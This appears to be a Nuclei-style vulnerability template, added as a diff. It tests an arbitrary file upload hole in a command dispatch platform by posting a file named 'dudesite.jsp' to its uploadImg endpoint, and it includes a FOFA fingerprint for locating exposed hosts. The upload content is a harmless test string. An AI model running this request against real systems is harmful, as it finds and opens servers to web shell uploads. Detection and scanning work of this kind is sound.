@@ -1,0 +1,68 @@
+id: poc-nh3q1m5801812u9k
+info:
+  name: 可视化融合指挥调度平台 UploadImg接口 任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/nh3q1m5801812u9k'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: nh3q1m5801812u9k
+    fofa: body="base/searchInfoWindow_min.cs
+http:
+- raw:
+  - 'POST /dispatch/layuiIm/uploadImg HTTP/1.1
+
+
+    Upgrade-Insecure-Requests: 1
+
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+
+
+    Accept-Encoding: gzip, deflate
+
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+
+    Connection: close
+
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7ctER307B0RaQwOp
+
+
+
+
+    ------WebKitFormBoundary7ctER307B0RaQwOp
+
+
+    Content-Disposition: form-data; name="file";filename="dudesite.jsp"
+
+
+
+
+    123456
+
+
+    ------WebKitFormBoundary7ctER307B0RaQwOp--
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    success
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
